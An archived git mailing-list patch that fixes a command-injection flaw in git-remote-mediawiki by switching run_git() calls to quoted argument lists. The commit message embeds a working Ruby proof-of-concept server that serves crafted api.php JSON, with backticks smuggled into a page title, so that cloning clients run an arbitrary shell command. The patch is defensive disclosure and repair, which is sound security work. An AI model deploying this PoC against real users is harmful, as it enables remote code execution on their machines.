Return-Path: <SRS0=LBHq=C6=vger.kernel.org=git-owner@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
X-Spam-Level: 
X-Spam-Status: No, score=-17.6 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
	HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,MAILING_LIST_MULTI,
	MENTIONS_GIT_HOSTING,SIGNED_OFF_BY,SPF_HELO_NONE,SPF_PASS,URIBL_BLOCKED,
	USER_AGENT_GIT autolearn=ham autolearn_force=no version=3.4.0
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 7622AC43468
	for <git@archiver.kernel.org>; Mon, 21 Sep 2020 10:40:46 +0000 (UTC)
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.kernel.org (Postfix) with ESMTP id 3275320684
	for <git@archiver.kernel.org>; Mon, 21 Sep 2020 10:40:46 +0000 (UTC)
Authentication-Results: mail.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ixtSUVDj"
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1726850AbgIUKkp (ORCPT <rfc822;git@archiver.kernel.org>);
        Mon, 21 Sep 2020 06:40:45 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:34066 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1726835AbgIUKkd (ORCPT <rfc822;git@vger.kernel.org>);
        Mon, 21 Sep 2020 06:40:33 -0400
Received: from mail-wr1-x442.google.com (mail-wr1-x442.google.com [IPv6:2a00:1450:4864:20::442])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 682BDC0613D2
        for <git@vger.kernel.org>; Mon, 21 Sep 2020 03:40:33 -0700 (PDT)
Received: by mail-wr1-x442.google.com with SMTP id o5so12167670wrn.13
        for <git@vger.kernel.org>; Mon, 21 Sep 2020 03:40:33 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=from:to:cc:subject:date:message-id:in-reply-to:references
         :mime-version:content-transfer-encoding;
        bh=rjjRy2c8PqxnH23fb73MKz89oWnF3p7HqIOb24faIJE=;
        b=ixtSUVDjkIVPt8QcS41oxdUJtFeOr6TUH04OshjehZahPBQB4xXw77IRjZQcAtPDRi
         /2WQ2A34MG7rgLNQkE5gHgbo/DyRpTxoZPg9wWQNggZml8OxtrWdtLKge8WqXv1e+726
         izcdOfYMOuR1uqKpeADHCqc8vsokIPM8Epz8yVvJy0EwdbepIMV6+3V+04bciERmKMeT
         lRrQloSAPZX0jo2BeV0Ua5hs3DpCo9IBzdIZt5Rix1B6PER0QhMVSQQHS0P7b0XfCDIy
         26e1+IFfpyLKuH2NMzmxgQJcqtK/xXvDBNqBCv+Wa4P2D3Td93vO9Mt2lolIDq6XdJHw
         DNhQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:to:cc:subject:date:message-id:in-reply-to
         :references:mime-version:content-transfer-encoding;
        bh=rjjRy2c8PqxnH23fb73MKz89oWnF3p7HqIOb24faIJE=;
        b=ghPfPjNe/BUbVpz+DwUJu3cfu6GolB6rl5XHyCoQYT9kGqkc12ERp8OpsdFFwzARnJ
         yiPy80FLn3xNwHoBaPtYwnnU4gU/WXog7myq+VfFZ4YsSzc281cDU9PVFMjM3hira+V3
         3EiMDMY3EBmSCIeRZs7EDBq/DbiSH+lt/byttk7E1wWrxGYskHlI0C2kBI/GYyXmeNUf
         Mg5NPxKuO+qzSLRpNg7SxTPOYz7L1esByHquBCPRZbDUD0eZnow3aLwzwY1SI/T9tktl
         88xYAVvHp7Jcs5h0h4Ta53CMQBpKEmuLteDTNOxz0RddAM4JUmQtRxfZj1gxEFZI+fZy
         4FoA==
X-Gm-Message-State: AOAM533AAL3oZJRUv7RYNGH3VvGrYsu3NuTcrW+jIz0jkUZCUdEYXodS
        y+jKePloy2nD+1TAx/375er7Ax9Kj2ORnQ==
X-Google-Smtp-Source: ABdhPJwr4HguBzw855wRUftouOtsTbg2w1vVhoXVmKxcZt2WC6+7C1/zgTxdRTP92v8V7FQWxFPL0Q==
X-Received: by 2002:adf:f190:: with SMTP id h16mr52583596wro.202.1600684831482;
        Mon, 21 Sep 2020 03:40:31 -0700 (PDT)
Received: from vm.nix.is (vm.nix.is. [2a01:4f8:120:2468::2])
        by smtp.gmail.com with ESMTPSA id 9sm18647833wmf.7.2020.09.21.03.40.30
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 21 Sep 2020 03:40:30 -0700 (PDT)
From:   =?UTF-8?q?=C3=86var=20Arnfj=C3=B6r=C3=B0=20Bjarmason?= 
        <avarab@gmail.com>
To:     git@vger.kernel.org
Cc:     Junio C Hamano <gitster@pobox.com>,
        Matthieu Moy <git@matthieu-moy.fr>,
        Johannes Schindelin <Johannes.Schindelin@gmx.de>,
        =?UTF-8?q?Antoine=20Beaupr=C3=A9?= <anarcat@debian.org>,
        =?UTF-8?q?=C4=90o=C3=A0n=20Tr=E1=BA=A7n=20C=C3=B4ng=20Danh?= 
        <congdanhqx@gmail.com>, imon Legner <Simon.Legner@gmail.com>,
        Eric Sunshine <sunshine@sunshineco.com>,
        Jeff King <peff@peff.net>,
        =?UTF-8?q?=C3=86var=20Arnfj=C3=B6r=C3=B0=20Bjarmason?= 
        <avarab@gmail.com>, Joern Schneeweisz <jschneeweisz@gitlab.com>
Subject: [PATCH v2 16/18] remote-mediawiki: convert to quoted run_git() invocation
Date:   Mon, 21 Sep 2020 12:39:58 +0200
Message-Id: <20200921104000.2304-17-avarab@gmail.com>
X-Mailer: git-send-email 2.28.0.297.g1956fa8f8d
In-Reply-To: <20200916102918.29805-1-avarab@gmail.com>
References: <20200916102918.29805-1-avarab@gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org

Change those callsites that are able to call run_safe() with a quoted
list of arguments to do so.

This fixes a RCE bug in this transport helper reported by Joern
Schneeweisz to the git-security mailing list. The issue is being made
public due to the relative obscurity of the remote-mediawiki code.

The security issue is that we'd execute a command like this via Perl's
"open -|", where the $name is taken directly from the api.php
response. So that a JSON response of e.g.:

    [...]"title":"`id>/tmp/mw`:Main Page"[..]

Would result in an invocation of:

    git config --add remote.origin.namespaceCache "`id>/tmp/mw`:notANameSpace"

From code such as this, which is being changed by this patch:

    run_git(qq(config --add remote.${remotename}.namespaceCache "${name}:${store_id}"));

So we'd execute an arbitrary command, and also put
"remote.origin.namespaceCache=:notANameSpace" in the config. With this
change we quote all of this, so now we'll simply write
"remote.origin.namespaceCache=`id>/tmp/x`:notANameSpace" into the
config, and not execute any remote commands.

About the implementation: as noted in [1] (see also [2]) this style of
invoking open() has compatibility issues on Windows up to Perl
5.22. However, Johannes Schindelin notes that we shouldn't worry about
Windows in this context because (quoting a private E-Mail of his):

    1. The mediawiki helper has never been shipped as part of an
       official Git for Windows version. Neither has it ever been part
       of an official MSYS2 package. Which means that Windows users
       who want to use the mediawiki helper have to build Git
       themselves, which not many users seem to do.

    2. The last Git for Windows version to ship with Perl v5.22.x was
       Git for Windows v2.11.1; Since Git for Windows
       v2.12.0 (released on February 25th, 2017), only newer Perl
       versions were included.

So let's just use this open() API. Grepping around shows that various
other Perl code we ship such as gitweb etc. uses this way of calling
open(), so we shouldn't have any issues with compatibility.

For further reference and future testing, here's working exploit code
provided by Joern:

    #!/usr/bin/ruby
    # git client side RCE via `mediawiki` remote proof of concept
    # Joern Schneeweisz - GitLab Security Research Team

    require 'sinatra'
    set bind: '0.0.0.0'

    if not ARGV[0]

      puts "Please provide the shell command to be execucted."
      exit -1

    end

    cmd = ARGV[0]
    all_pages = sprintf('{"limits":{"allpages":500},"query":{"allpages":[{"pageid":1,"ns":3,"title":"`%s`:Main Page"}]}}', cmd)
    revs = sprintf('{"query":{"pages":{"1":{"pageid":1,"ns":3,"title":"`%s`:Main Page","revisions":[{"revid":1,"parentid":0,"user":"MediaWiki default","timestamp":"2020-09-04T20:25:08Z","contentformat":"text/x-wiki","contentmodel":"wikitext","comment":"","*":"<al:MyLanguage/Help:Contents]"}]}}}}', cmd)
    mainpage= sprintf('{"batchcomplete":"","query":{"pages":{"1":{"pageid":1,"ns":3,"title":"`%s`:Main Page","revisions":[{"revid":1,"parentid":0}]}}}}',cmd)

    post '/api.php' do

      if params[:list] == 'allpages'
        return all_pages
      end

      if params[:prop] == 'revisions'
        return revs
      end

      return mainpage
    end

Which:

    [...] should be run like: `ruby wiki.rb 'id>/tmp/mw'`. Now when
    being cloned with `git clone mediawiki::http://localhost:4567` the
    file `/tmp/mw` will be created during the clone process,
    containing the output of `id`.

1. https://perldoc.perl.org/functions/open.html#Opening-a-filehandle-into-a-command
2. https://perldoc.perl.org/perlipc.html#Safe-Pipe-Opens

Reported-by: Joern Schneeweisz <jschneeweisz@gitlab.com>
Signed-off-by: Ævar Arnfjörð Bjarmason <avarab@gmail.com>
---
 contrib/mw-to-git/git-remote-mediawiki.perl | 49 +++++++++++----------
 1 file changed, 26 insertions(+), 23 deletions(-)

diff --git a/contrib/mw-to-git/git-remote-mediawiki.perl b/contrib/mw-to-git/git-remote-mediawiki.perl
index 59cb277517..bbf68ddc46 100755
--- a/contrib/mw-to-git/git-remote-mediawiki.perl
+++ b/contrib/mw-to-git/git-remote-mediawiki.perl
@@ -56,38 +56,38 @@
 
 # Accept both space-separated and multiple keys in config file.
 # Spaces should be written as _ anyway because we'll use chomp.
-my @tracked_pages = split(/[ \n]/, run_git("config --get-all remote.${remotename}.pages"));
+my @tracked_pages = split(/[ \n]/, run_git_quoted(["config", "--get-all", "remote.${remotename}.pages"]));
 chomp(@tracked_pages);
 
 # Just like @tracked_pages, but for MediaWiki categories.
-my @tracked_categories = split(/[ \n]/, run_git("config --get-all remote.${remotename}.categories"));
+my @tracked_categories = split(/[ \n]/, run_git_quoted(["config", "--get-all", "remote.${remotename}.categories"]));
 chomp(@tracked_categories);
 
 # Just like @tracked_categories, but for MediaWiki namespaces.
-my @tracked_namespaces = split(/[ \n]/, run_git("config --get-all remote.${remotename}.namespaces"));
+my @tracked_namespaces = split(/[ \n]/, run_git_quoted(["config", "--get-all", "remote.${remotename}.namespaces"]));
 for (@tracked_namespaces) { s/_/ /g; }
 chomp(@tracked_namespaces);
 
 # Import media files on pull
-my $import_media = run_git("config --get --bool remote.${remotename}.mediaimport");
+my $import_media = run_git_quoted(["config", "--get", "--bool", "remote.${remotename}.mediaimport"]);
 chomp($import_media);
 $import_media = ($import_media eq 'true');
 
 # Export media files on push
-my $export_media = run_git("config --get --bool remote.${remotename}.mediaexport");
+my $export_media = run_git_quoted(["config", "--get", "--bool", "remote.${remotename}.mediaexport"]);
 chomp($export_media);
 $export_media = !($export_media eq 'false');
 
-my $wiki_login = run_git("config --get remote.${remotename}.mwLogin");
+my $wiki_login = run_git_quoted(["config", "--get", "remote.${remotename}.mwLogin"]);
 # Note: mwPassword is discouraged. Use the credential system instead.
-my $wiki_passwd = run_git("config --get remote.${remotename}.mwPassword");
-my $wiki_domain = run_git("config --get remote.${remotename}.mwDomain");
+my $wiki_passwd = run_git_quoted(["config", "--get", "remote.${remotename}.mwPassword"]);
+my $wiki_domain = run_git_quoted(["config", "--get", "remote.${remotename}.mwDomain"]);
 chomp($wiki_login);
 chomp($wiki_passwd);
 chomp($wiki_domain);
 
 # Import only last revisions (both for clone and fetch)
-my $shallow_import = run_git("config --get --bool remote.${remotename}.shallow");
+my $shallow_import = run_git_quoted(["config", "--get", "--bool", "remote.${remotename}.shallow"]);
 chomp($shallow_import);
 $shallow_import = ($shallow_import eq 'true');
 
@@ -97,9 +97,9 @@
 # Possible values:
 # - by_rev: perform one query per new revision on the remote wiki
 # - by_page: query each tracked page for new revision
-my $fetch_strategy = run_git("config --get remote.${remotename}.fetchStrategy");
+my $fetch_strategy = run_git_quoted(["config", "--get", "remote.${remotename}.fetchStrategy"]);
 if (!$fetch_strategy) {
-	$fetch_strategy = run_git('config --get mediawiki.fetchStrategy');
+	$fetch_strategy = run_git_quoted(["config", "--get", "mediawiki.fetchStrategy"]);
 }
 chomp($fetch_strategy);
 if (!$fetch_strategy) {
@@ -123,9 +123,9 @@
 # will get the history with information lost). If the import is
 # deterministic, this means everybody gets the same sha1 for each
 # MediaWiki revision.
-my $dumb_push = run_git("config --get --bool remote.${remotename}.dumbPush");
+my $dumb_push = run_git_quoted(["config", "--get", "--bool", "remote.${remotename}.dumbPush"]);
 if (!$dumb_push) {
-	$dumb_push = run_git('config --get --bool mediawiki.dumbPush');
+	$dumb_push = run_git_quoted(["config", "--get", "--bool", "mediawiki.dumbPush"]);
 }
 chomp($dumb_push);
 $dumb_push = ($dumb_push eq 'true');
@@ -984,7 +984,7 @@ sub mw_import_revids {
 }
 
 sub error_non_fast_forward {
-	my $advice = run_git('config --bool advice.pushNonFastForward');
+	my $advice = run_git_quoted(["config", "--bool", "advice.pushNonFastForward"]);
 	chomp($advice);
 	if ($advice ne 'false') {
 		# Native git-push would show this after the summary.
@@ -1028,7 +1028,7 @@ sub mw_upload_file {
 		}
 	} else {
 		# Don't let perl try to interpret file content as UTF-8 => use "raw"
-		my $content = run_git("cat-file blob ${new_sha1}", 'raw');
+		my $content = run_git_quoted(["cat-file", "blob", $new_sha1], 'raw');
 		if ($content ne EMPTY) {
 			$mediawiki = connect_maybe($mediawiki, $remotename, $url);
 			$mediawiki->{config}->{upload_url} =
@@ -1098,7 +1098,7 @@ sub mw_push_file {
 			# with this content instead:
 			$file_content = DELETED_CONTENT;
 		} else {
-			$file_content = run_git("cat-file blob ${new_sha1}");
+			$file_content = run_git_quoted(["cat-file", "blob", $new_sha1]);
 		}
 
 		$mediawiki = connect_maybe($mediawiki, $remotename, $url);
@@ -1211,7 +1211,7 @@ sub mw_push_revision {
 		my $parsed_sha1 = $remoteorigin_sha1;
 		# Find a path from last MediaWiki commit to pushed commit
 		print {*STDERR} "Computing path from local to remote ...\n";
-		my @local_ancestry = split(/\n/, run_git("rev-list --boundary --parents ${local} ^${parsed_sha1}"));
+		my @local_ancestry = split(/\n/, run_git_quoted(["rev-list", "--boundary", "--parents", $local, "^${parsed_sha1}"]));
 		my %local_ancestry;
 		foreach my $line (@local_ancestry) {
 			if (my ($child, $parents) = $line =~ /^-?([a-f0-9]+) ([a-f0-9 ]+)/) {
@@ -1235,7 +1235,7 @@ sub mw_push_revision {
 		# No remote mediawiki revision. Export the whole
 		# history (linearized with --first-parent)
 		print {*STDERR} "Warning: no common ancestor, pushing complete history\n";
-		my $history = run_git("rev-list --first-parent --children ${local}");
+		my $history = run_git_quoted(["rev-list", "--first-parent", "--children", $local]);
 		my @history = split(/\n/, $history);
 		@history = @history[1..$#history];
 		foreach my $line (reverse @history) {
@@ -1247,12 +1247,12 @@ sub mw_push_revision {
 	foreach my $commit_info_split (@commit_pairs) {
 		my $sha1_child = @{$commit_info_split}[0];
 		my $sha1_commit = @{$commit_info_split}[1];
-		my $diff_infos = run_git("diff-tree -r --raw -z ${sha1_child} ${sha1_commit}");
+		my $diff_infos = run_git_quoted(["diff-tree", "-r", "--raw", "-z", $sha1_child, $sha1_commit]);
 		# TODO: we could detect rename, and encode them with a #redirect on the wiki.
 		# TODO: for now, it's just a delete+add
 		my @diff_info_list = split(/\0/, $diff_infos);
 		# Keep the subject line of the commit message as mediawiki comment for the revision
-		my $commit_msg = run_git(qq(log --no-walk --format="%s" ${sha1_commit}));
+		my $commit_msg = run_git_quoted(["log", "--no-walk", '--format="%s"', $sha1_commit]);
 		chomp($commit_msg);
 		# Push every blob
 		while (@diff_info_list) {
@@ -1277,7 +1277,10 @@ sub mw_push_revision {
 			}
 		}
 		if (!$dumb_push) {
-			run_git(qq(notes --ref=${remotename}/mediawiki add -f -m "mediawiki_revision: ${mw_revision}" ${sha1_commit}));
+			run_git_quoted(["notes", "--ref=${remotename}/mediawiki",
+					"add", "-f", "-m",
+					"mediawiki_revision: ${mw_revision}",
+					$sha1_commit]);
 		}
 	}
 
@@ -1318,7 +1321,7 @@ sub get_mw_namespace_id {
 		# already cached. Namespaces are stored in form:
 		# "Name_of_namespace:Id_namespace", ex.: "File:6".
 		my @temp = split(/\n/,
-				 run_git("config --get-all remote.${remotename}.namespaceCache"));
+				 run_git_quoted(["config", "--get-all", "remote.${remotename}.namespaceCache"]));
 		chomp(@temp);
 		foreach my $ns (@temp) {
 			my ($n, $id) = split(/:/, $ns);
@@ -1372,7 +1375,7 @@ sub get_mw_namespace_id {
 
 	# Store explicitly requested namespaces on disk
 	if (!exists $cached_mw_namespace_id{$name}) {
-		run_git(qq(config --add remote.${remotename}.namespaceCache "${name}:${store_id}"));
+		run_git_quoted(["config", "--add", "remote.${remotename}.namespaceCache", "${name}:${store_id}"]);
 		$cached_mw_namespace_id{$name} = 1;
 	}
 	return $id;
-- 
2.28.0.297.g1956fa8f8d

